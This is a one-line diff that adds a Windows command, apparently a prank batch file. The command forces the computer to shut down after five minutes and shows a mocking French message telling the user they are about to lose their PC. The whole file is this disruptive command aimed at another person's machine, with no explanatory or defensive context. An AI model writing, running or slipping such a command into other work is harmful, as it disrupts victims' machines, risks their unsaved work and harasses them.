@@ -1,0 +1,1 @@
+﻿shutdown -s -t 300 -c "Dans 5 minutes tu n'as plus du pc, Rekt t'a bien def. ton pc"
